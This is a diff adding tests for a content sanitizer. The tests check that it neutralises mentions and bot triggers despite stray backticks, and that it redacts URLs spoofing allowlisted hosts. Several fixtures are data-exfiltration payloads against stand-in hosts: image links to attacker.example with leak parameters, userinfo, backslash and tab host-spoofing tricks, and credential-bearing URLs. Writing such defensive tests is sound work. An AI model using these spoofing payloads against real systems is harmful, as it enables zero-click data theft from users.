@@ -101,6 +101,11 @@ describe("sanitize_content.cjs", () => {
       const result = sanitizeContent("/smoke-copilot-sdk run tests");
       expect(result).toBe("`/smoke-copilot-sdk` run tests");
     });
+
+    it("should keep commands neutralized when the body contains attacker backticks", () => {
+      const result = sanitizeContent("/bot run ` later");
+      expect(result).toBe("``/bot`` run ` later");
+    });
   });
 
   describe("@mention neutralization", () => {
@@ -137,6 +142,42 @@ describe("sanitize_content.cjs", () => {
     it("should neutralize @mentions with multiple underscores", () => {
       const result = sanitizeContent("Hello @user_name_test");
       expect(result).toBe("Hello `@user_name_test`");
+    });
+
+    it("should use a distinct delimiter for mentions after unmatched backticks", () => {
+      expect(sanitizeContent("note ` @octocat done")).toBe("note ` ``@octocat`` done");
+    });
+
+    it("should preserve mentions already contained by matched attacker backticks", () => {
+      expect(sanitizeContent("start ` mid @octocat end ` tail")).toBe("start ` mid @octocat end ` tail");
+    });
+
+    it("should choose a delimiter length absent from the complete input", () => {
+      expect(sanitizeContent("one ` two `` @octocat done")).toBe("one ` two `` ```@octocat``` done");
+    });
+
+    it("should neutralize mentions adjacent to unmatched backticks", () => {
+      expect(sanitizeContent("`@octocat")).toBe("` ``@octocat``");
+      expect(sanitizeContent("``@octocat`")).toBe("`` ```@octocat``` `");
+      expect(sanitizeContent("@octocat`")).toBe("``@octocat`` `");
+    });
+
+    it("should preserve mentions inside matched code spans", () => {
+      expect(sanitizeContent("`@octocat`")).toBe("`@octocat`");
+    });
+
+    it("should separate neutralized mentions from adjacent matched code spans", () => {
+      expect(sanitizeContent("`x`@octocat @other")).toBe("`x` ``@octocat`` ``@other``");
+      expect(sanitizeContent("@octocat`x`")).toBe("``@octocat`` `x`");
+    });
+
+    it("should not treat inline code with trailing prose as a fenced block", () => {
+      expect(sanitizeContent("```x```@octocat")).toBe("```x``` `@octocat`");
+    });
+
+    it("should neutralize a mention after truncating its alias", () => {
+      expect(sanitizeContent("123456 @octocat", 10)).toBe("123456 `@oc`\n[Content truncated due to length]");
+      expect(sanitizeContent("123456 @octocat", { maxLength: 10, allowedAliases: ["author"] })).toBe("123456 `@oc`\n[Content truncated due to length]");
     });
 
     it("should neutralize @mentions with underscores and hyphens", () => {
@@ -441,9 +482,9 @@ describe("sanitize_content.cjs", () => {
     });
 
     it("should move title into link text for inline link with angle-bracket URL", () => {
-      // Note: convertXmlTags runs after neutralizeMarkdownLinkTitles and converts <url> to (url)
+      // Angle-bracket HTTPS autolinks are preserved so CommonMark/Slack link syntax survives sanitization.
       const result = sanitizeContent('[click here](<https://github.com/path> "injected payload")');
-      expect(result).toBe("[click here (injected payload)]((https://github.com/path))");
+      expect(result).toBe("[click here (injected payload)](<https://github.com/path>)");
     });
 
     it("should move multiple link titles into link text in the same content", () => {
@@ -579,6 +620,43 @@ describe("sanitize_content.cjs", () => {
       const result = sanitizeContent("<img/onerror=alert(1) src=x>");
       expect(result).toContain("<img");
       expect(result).not.toContain("onerror");
+    });
+
+    it("should preserve HTTPS angle-bracket autolinks", () => {
+      const input = "Tracking issue: <https://github.com/octo-org/octo-repo/issues/123>";
+      expect(sanitizeContent(input)).toBe(input);
+    });
+
+    it("should preserve Slack mrkdwn links on allowed HTTPS domains", () => {
+      const input = "Tracking issue: <https://github.com/octo-org/octo-repo/issues/123|Build failure — Build github/gh-aw#456>";
+      expect(sanitizeContent(input)).toBe(input);
+    });
+
+    it("should not preserve IPv6 angle-bracket links", () => {
+      // IPv6 authority is not a simple [\w.-]+ hostname — treat as unknown tag
+      const result = sanitizeContent("<https://[2001:db8::1]/path>");
+      expect(result).not.toContain("<https://[2001:db8::1]");
+    });
+
+    it("should not preserve userinfo angle-bracket links", () => {
+      // Userinfo (user@host) must not bypass domain filtering
+      const result = sanitizeContent("<https://github.com@evil.example/path>");
+      expect(result).not.toContain("<https://github.com@evil.example");
+    });
+
+    it("should redact Slack mrkdwn links with disallowed domains", () => {
+      // Domain is blocked — URL is redacted but label text is preserved so the
+      // author's visible link text is not silently lost.
+      const result = sanitizeContent("<https://evil.example.com/path|Build failure>");
+      expect(result).toContain("evil.example.com/redacted"); // domain shows in redacted form
+      expect(result).toContain("Build failure"); // label is preserved
+      expect(result).not.toContain("<https://evil.example.com"); // not in original angle-bracket form
+    });
+
+    it("should redact plain angle-bracket autolinks with disallowed domains", () => {
+      const result = sanitizeContent("<https://evil.example.com/path>");
+      expect(result).toContain("evil.example.com/redacted"); // domain shows in redacted form
+      expect(result).not.toContain("<https://evil.example.com"); // not in original angle-bracket form
     });
 
     it("should handle CDATA sections", () => {
@@ -1121,7 +1199,49 @@ describe("sanitize_content.cjs", () => {
     it("should log redacted domains", () => {
       sanitizeContent("Visit https://verylongdomainnamefortest.com/page");
       expect(mockCore.info).toHaveBeenCalledWith(expect.stringContaining("Redacted URL:"));
-      expect(mockCore.debug).toHaveBeenCalledWith(expect.stringContaining("Redacted URL (full):"));
+      expect(mockCore.debug).not.toHaveBeenCalledWith(expect.stringContaining("Redacted URL (full):"));
+    });
+
+    it("should strip credentials from HTTPS URLs on allowed domains", () => {
+      // Credentials must not appear in the output even when the domain is allowed
+      const result = sanitizeContent("https://user:SECRET_TOKEN@github.com/org/repo.git");
+      expect(result).not.toContain("SECRET_TOKEN");
+      expect(result).not.toContain("user:SECRET_TOKEN@");
+      expect(result).toContain("github.com");
+    });
+
+    it("should strip credentials from HTTPS URLs on disallowed domains", () => {
+      const result = sanitizeContent("See https://user:MYPASSWORD@evil.example.com/repo.git");
+      expect(result).not.toContain("MYPASSWORD");
+      expect(result).not.toContain("user:MYPASSWORD@");
+    });
+
+    it("should strip credentials from non-HTTPS URLs before redacting", () => {
+      const result = sanitizeContent("git://x-token-user:ACCESS_TOKEN@github.com/org/repo.git");
+      expect(result).not.toContain("ACCESS_TOKEN");
+      expect(result).not.toContain("x-token-user:");
+    });
+
+    it("should not log full URLs with credentials in info or debug logs", () => {
+      sanitizeContent("https://user:SENTINEL_PASSWORD@evil.example.com/repo.git");
+      const allInfoCalls = mockCore.info.mock.calls.flat().join(" ");
+      const allDebugCalls = mockCore.debug.mock.calls.flat().join(" ");
+      expect(allInfoCalls).not.toContain("SENTINEL_PASSWORD");
+      expect(allDebugCalls).not.toContain("SENTINEL_PASSWORD");
+    });
+
+    it("should not log full rejected URLs with signed query strings", () => {
+      sanitizeContent("See https://evil.example.com/file?sig=SECRET_SIG&token=BEARER_VAL");
+      const allInfoCalls = mockCore.info.mock.calls.flat().join(" ");
+      const allDebugCalls = mockCore.debug.mock.calls.flat().join(" ");
+      expect(allInfoCalls).not.toContain("SECRET_SIG");
+      expect(allDebugCalls).not.toContain("SECRET_SIG");
+    });
+
+    it("should strip username-only userinfo (no password)", () => {
+      const result = sanitizeContent("Clone with https://myuser@github.com/org/repo.git");
+      expect(result).not.toContain("myuser@");
+      expect(result).toContain("github.com");
     });
 
     it("should support wildcard domain patterns (*.example.com)", () => {
@@ -1250,7 +1370,7 @@ describe("sanitize_content.cjs", () => {
     it("should log redacted protocol-relative URL domains", () => {
       sanitizeContent("Visit //evil.com/steal");
       expect(mockCore.info).toHaveBeenCalledWith(expect.stringContaining("Redacted URL:"));
-      expect(mockCore.debug).toHaveBeenCalledWith(expect.stringContaining("Redacted URL (full):"));
+      expect(mockCore.debug).not.toHaveBeenCalledWith(expect.stringContaining("Redacted URL (full):"));
     });
 
     it("should redact protocol-relative URL with port number", () => {
@@ -1300,6 +1420,198 @@ describe("sanitize_content.cjs", () => {
       // "word//evil.com/path" has no delimiter before //, so it should not be caught
       const result = sanitizeContent("word//evil.com/path");
       expect(result).toContain("word//evil.com/path");
+    });
+  });
+
+  describe("URL userinfo authority spoofing", () => {
+    // A URL authority may carry a "userinfo@" prefix. Everything before the last
+    // "@" is credentials, not the host, so "https://github.com@evil.com/x"
+    // connects to evil.com even though the allowlisted "github.com" appears
+    // first. Redaction must key off the real host in every URL form.
+
+    it("should redact an https URL whose allowlisted host is only userinfo", () => {
+      const result = sanitizeContent("https://github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a markdown image whose https host is spoofed via userinfo", () => {
+      // Zero-click exfiltration vector: GitHub's camo proxy fetches image URLs
+      // server-side when the rendered comment is viewed.
+      const result = sanitizeContent("![x](https://github.com@attacker.example/pixel.gif?leak=SENTINEL)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a protocol-relative URL whose allowlisted host is only userinfo", () => {
+      // Browsers on an HTTPS page resolve //host/path to https://host/path.
+      const result = sanitizeContent("//github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a markdown image whose protocol-relative host is spoofed via userinfo", () => {
+      const result = sanitizeContent("![x](//github.com@attacker.example/pixel.gif?leak=SENTINEL)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a protocol-relative URL with no path when the host is spoofed", () => {
+      const result = sanitizeContent("//github.com@evil.com");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("github.com@");
+    });
+
+    it("should redact a protocol-relative URL whose userinfo carries a port", () => {
+      const result = sanitizeContent("//github.com:443@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a protocol-relative URL with chained userinfo segments", () => {
+      // The LAST "@" delimits the real host, so every earlier segment is userinfo.
+      const result = sanitizeContent("//a@github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a protocol-relative URL with user:password userinfo", () => {
+      const result = sanitizeContent("//user:SENTINEL_PASSWORD@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("SENTINEL_PASSWORD");
+    });
+
+    it("should redact a spoofed protocol-relative host regardless of case", () => {
+      const result = sanitizeContent("//GitHub.com@EVIL.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("EVIL.com/x");
+    });
+
+    it("should redact a spoofed protocol-relative URL inside an HTML src attribute", () => {
+      const result = sanitizeContent('<img src="//github.com@evil.com/p.png">');
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/p.png");
+    });
+
+    it("should redact every spoofed protocol-relative URL when several appear", () => {
+      const result = sanitizeContent("//github.com@evil.com/a //github.com@bad.org/b");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).toContain("(bad.org/redacted)");
+      expect(result).not.toContain("github.com@");
+    });
+
+    it("should strip userinfo but keep the URL when the real host is allowed", () => {
+      const result = sanitizeContent("//github.com@github.com/ok");
+      expect(result).toContain("//github.com/ok");
+      expect(result).not.toContain("github.com@");
+    });
+
+    it("should not treat an @ in a protocol-relative path as userinfo", () => {
+      const result = sanitizeContent("//github.com/a@b");
+      expect(result).toContain("//github.com/a@b");
+    });
+
+    it("should not treat an @ in a protocol-relative query string as userinfo", () => {
+      const result = sanitizeContent("//github.com/repo?u=a@b.com");
+      expect(result).toContain("//github.com/repo?u=a@b.com");
+    });
+
+    it("should not corrupt // path segments inside an allowed absolute URL", () => {
+      const result = sanitizeContent("https://github.com//issues");
+      expect(result).toContain("https://github.com//issues");
+    });
+
+    // A URL-spoofing check is only as good as its agreement with the parser that
+    // will eventually fetch the URL. Each case below is a place where the
+    // sanitizer's regex view of "where does the authority end" or "where does a
+    // URL begin" once diverged from a browser's, letting a spoofed host through.
+
+    it("should strip userinfo from a spoofed URL that immediately follows another URL", () => {
+      // A greedy authority once swallowed the "," and the following "https:",
+      // so the global scan resumed past the second URL and never stripped it.
+      const result = sanitizeContent("https://github.com/a,https://github.com@attacker.example/p?leak=SENTINEL");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should strip userinfo from adjacent protocol-relative markdown images", () => {
+      const result = sanitizeContent("![a](//x.example)![b](//github.com@attacker.example/p.gif?leak=SENTINEL)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host in a CommonMark angle-bracket link destination", () => {
+      const result = sanitizeContent("![p](<//github.com@attacker.example/pixel.gif?leak=SENTINEL>)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host in an unquoted HTML src attribute", () => {
+      const result = sanitizeContent("<img src=//github.com@attacker.example/p.gif?leak=SENTINEL>");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host behind backslash separators", () => {
+      // URL parsers treat "\" as "/" for special schemes, so \\host resolves
+      // exactly like //host.
+      const result = sanitizeContent('<img src="\\\\github.com@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host behind a mixed slash-backslash separator", () => {
+      const result = sanitizeContent('<img src="/\\github.com@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a disallowed host behind backslash separators without userinfo", () => {
+      const result = sanitizeContent('<img src="\\\\attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host split by a tab, which URL parsers discard", () => {
+      const result = sanitizeContent('<img src="//github.com\tA@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host split by an encoded tab entity", () => {
+      const result = sanitizeContent('<img src="//github.com&#9;A@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host split by a newline, which URL parsers discard", () => {
+      const result = sanitizeContent('<img src="//github.com\nA@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed protocol-relative host in a query parameter", () => {
+      const result = sanitizeContent("https://github.com/a?redirect=//github.com@attacker.example/p?leak=SENTINEL");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should not redact an allowed host that merely follows a newline in prose", () => {
+      // Tab/CR/LF are tolerated inside an authority only to defeat the parser
+      // differential above; an ordinary host followed by prose must be intact.
+      const result = sanitizeContent("//github.com/repo\nnext line of prose");
+      expect(result).toContain("//github.com/repo");
+      expect(result).toContain("next line of prose");
+    });
+
+    it("should not redact an allowed protocol-relative URL in a query parameter", () => {
+      const result = sanitizeContent("https://github.com/a?redirect=//github.com/b");
+      expect(result).toContain("https://github.com/a?redirect=//github.com/b");
+    });
+
+    it("should leave Windows-style paths untouched", () => {
+      const result = sanitizeContent("C:\\Users\\me\\file.txt");
+      expect(result).toContain("C:\\Users\\me\\file.txt");
     });
   });
 
@@ -1395,10 +1707,11 @@ describe("sanitize_content.cjs", () => {
     });
 
     it("should handle domains with special characters in URL context", () => {
-      // The regex captures domain up to first special character like @
-      // So http://ex@mple-domain.co_uk.net captures only "ex" as domain
+      // Userinfo (ex@) is now stripped before domain matching, so the domain
+      // captured is "mple-domain.co_uk.net", sanitized to remove non-alphanumeric
+      // characters.
       const result = sanitizeContent("Visit http://ex@mple-domain.co_uk.net/path");
-      expect(result).toContain("(ex/redacted)");
+      expect(result).toContain("(mpledomain.couk.net/redacted)");
     });
 
     it("should preserve simple domain structure", () => {
@@ -1483,6 +1796,21 @@ describe("sanitize_content.cjs", () => {
       // The 12th entry (11th unquoted) is wrapped
       expect(result).toContain("`fixes #12`");
     });
+
+    it("should keep excess bot triggers neutralized when preceded by attacker backticks", () => {
+      const result = sanitizeContent("prefix ` fixes #1", { maxBotMentions: 0 });
+      expect(result).toBe("prefix ` ``fixes #1``");
+    });
+
+    it("should neutralize excess bot triggers adjacent to unmatched backticks", () => {
+      expect(sanitizeContent("`fixes #1", { maxBotMentions: 0 })).toBe("` ``fixes #1``");
+      expect(sanitizeContent("fixes #1`", { maxBotMentions: 0 })).toBe("``fixes #1`` `");
+    });
+
+    it("should separate excess bot triggers from adjacent matched code spans", () => {
+      expect(sanitizeContent("`x`fixes #1", { maxBotMentions: 0 })).toBe("`x` ``fixes #1``");
+      expect(sanitizeContent("```x```fixes #1", { maxBotMentions: 0 })).toBe("```x``` `fixes #1`");
+    });
   });
 
   describe("GitHub reference neutralization", () => {
@@ -1508,6 +1836,30 @@ describe("sanitize_content.cjs", () => {
 
       const result = sanitizeContent("See issue #123 and other/repo#456");
       expect(result).toBe("See issue #123 and `other/repo#456`");
+    });
+
+    it("should keep restricted references neutralized when preceded by attacker backticks", () => {
+      process.env.GITHUB_REPOSITORY = "myorg/myrepo";
+      process.env.GH_AW_ALLOWED_GITHUB_REFS = "repo";
+
+      const result = sanitizeContent("see ` other/repo#1337 now");
+      expect(result).toBe("see ` ``other/repo#1337`` now");
+    });
+
+    it("should neutralize restricted references adjacent to unmatched backticks", () => {
+      process.env.GITHUB_REPOSITORY = "myorg/myrepo";
+      process.env.GH_AW_ALLOWED_GITHUB_REFS = "repo";
+
+      expect(sanitizeContent("`other/repo#1337")).toBe("` ``other/repo#1337``");
+      expect(sanitizeContent("other/repo#1337`")).toBe("``other/repo#1337`` `");
+    });
+
+    it("should separate restricted references from adjacent matched code spans", () => {
+      process.env.GITHUB_REPOSITORY = "myorg/myrepo";
+      process.env.GH_AW_ALLOWED_GITHUB_REFS = "repo";
+
+      expect(sanitizeContent("`x`other/repo#1337")).toBe("`x` ``other/repo#1337``");
+      expect(sanitizeContent("```x```other/repo#1337")).toBe("```x``` `other/repo#1337`");
     });
 
     it("should allow current repo references with 'repo' keyword", () => {
@@ -1839,7 +2191,7 @@ describe("sanitize_content.cjs", () => {
 
     it("should handle nested backticks", () => {
       const result = sanitizeContent("Already `@user` and @other");
-      expect(result).toBe("Already `@user` and `@other`");
+      expect(result).toBe("Already `@user` and ``@other``");
     });
   });
 
